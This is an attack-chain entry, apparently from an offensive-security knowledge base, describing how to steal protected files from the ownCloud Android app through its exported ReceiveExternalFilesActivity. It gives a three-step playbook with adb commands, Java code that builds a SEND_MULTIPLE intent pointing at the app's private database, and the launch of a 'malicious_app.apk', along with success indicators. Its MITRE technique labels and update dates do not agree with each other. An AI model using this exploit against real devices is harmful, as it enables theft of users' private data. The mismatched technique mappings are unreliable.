---
id: ac-owncloud-exported-activity-theft
tags:
  - android
  - owncloud
  - exported-activity
  - intent-injection
  - data-theft
  - mobile-vulnerability
type: attack_chain
tools:
  - '[[tools/ADB-Android-Debug-Bridge]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
verified: false
platforms:
  - Android
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-Vulnerable-Exported-Activity]]'
  - '[[procedures/Craft-Malicious-Intent-for-File-Upload]]'
  - '[[procedures/Trigger-File-Upload-via-StartActivity]]'
step_count: 3
techniques:
  - '[[T1631]]'
  - '[[T1429]]'
updated_at: '2025-12-14T17:24:41.920Z'
description: >-
  Multi-stage attack exploiting an exported Android activity in the ownCloud app
  to steal sensitive files from the app's private data directory by tricking it
  into uploading them to the server via a malicious intent.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[T1631]]'
  - '[[T1429]]'
---
# Theft of Protected Files via Insecure Exported Activity in ownCloud Android App

Multi-stage attack chain demonstrating exploitation of an insecurely exported activity in the ownCloud Android app, allowing a malicious third-party app to read and upload sensitive files from the app's protected data directory (/data/data/com.owncloud.android/) to the ownCloud server without user interaction.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Exported Activity] --> B[Craft Malicious Intent]
    B --> C[Trigger Upload and Exfil]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ADB-Android-Debug-Bridge]]
- Android development environment (e.g., Android Studio for crafting intents)

### Target Environment

- Android device or emulator with ownCloud app installed (com.owncloud.android)
- Root access not required, but physical or ADB access to the device
- Malicious third-party app to send the intent (can be developed in Java/Kotlin)

### Initial Access Requirements

- Installed ownCloud app on the target device
- Ability to install and run a custom malicious app
- Network connectivity for the upload to ownCloud server

## Detailed Attack Procedures

### Step 1: Identify Vulnerable Exported Activity
procedure: [[procedures/Identify-Vulnerable-Exported-Activity]]

**Objective**: Locate the exported activity in the ownCloud app that handles SEND_MULTIPLE intents without proper URI validation, enabling access to protected files.

**Instructions**: Use ADB to inspect the app's manifest and components. First, list the package details with [[commands/adb-dumpsys-package]]:

```bash
adb shell dumpsys package com.owncloud.android | grep -A 10 -B 10 "ReceiveExternalFilesActivity"
```

This reveals the activity com.owncloud.android.ui.activity.ReceiveExternalFilesActivity is exported with intent filter android.intent.action.SEND_MULTIPLE, accepting arbitrary file URIs.

**Expected Output**: Output showing the activity's export status and intent filters, confirming no validation for protected paths like /data/data/com.owncloud.android/.

**Success Indicators**:
- Exported activity identified with SEND_MULTIPLE filter
- No restrictions on URI sources noted in manifest

### Step 2: Craft Malicious Intent for File Upload
procedure: [[procedures/Craft-Malicious-Intent-for-File-Upload]]

**Objective**: Create a malicious Intent in a third-party app that grants read permissions to a protected URI (e.g., the app's database) and targets the vulnerable activity.

**Instructions**: In your malicious Android app's Java code, construct the Intent. Use Android Studio or similar to write:

```java
import android.content.Intent;
import android.net.Uri;
import java.util.ArrayList;

Intent intent = new Intent(Intent.ACTION_SEND_MULTIPLE);
intent.setClassName("com.owncloud.android", "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
intent.setType("*/*");
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
ArrayList<Uri> uris = new ArrayList<>();
uris.add(Uri.parse("file:///data/data/com.owncloud.android/databases/filelist"));
intent.putParcelableArrayListExtra(Intent.EXTRA_STREAM, uris);
```

This intent points to a sensitive file like the database.

**Expected Output**: Intent object ready for dispatch, targeting protected files without authentication.

**Success Indicators**:
- Intent crafted with FLAG_GRANT_READ_URI_PERMISSION
- URI targets protected directory (e.g., databases/filelist)

### Step 3: Trigger File Upload via StartActivity
procedure: [[procedures/Trigger-File-Upload-via-StartActivity]]

**Objective**: Launch the intent to force the ownCloud app to read the protected file and upload it to the server, exfiltrating sensitive data like databases, cache, and file history.

**Instructions**: From the malicious app, call startActivity on the crafted intent. In Java:

```java
startActivity(intent);
```

Install the malicious app via ADB if needed: [[commands/adb-install-app]] with your APK.

```bash
adb install malicious_app.apk
adb shell am start -n com.malicious/.MainActivity
```

This triggers the ownCloud activity in its context, processing the URI and uploading the file.

**Expected Output**: The file (e.g., database) appears uploaded to the ownCloud server, accessible via the user's account.

**Success Indicators**:
- OwnCloud app launches briefly and processes the intent
- Sensitive file (e.g., filelist.db) visible on server
- No user prompts or errors during upload

## Attack Chain Summary

### Key Achievements

1. Identification of insecure exported component allowing arbitrary file access
2. Successful crafting of intent to target protected data without validation
3. Exfiltration of sensitive app data (databases, cache, history) to remote server

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[T1631]] Access Permission to Specific Component
- [[T1429]] Component with Known Vulnerability

### MITRE ATT&CK Tactics

- [[Discovery]] Discovery
- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
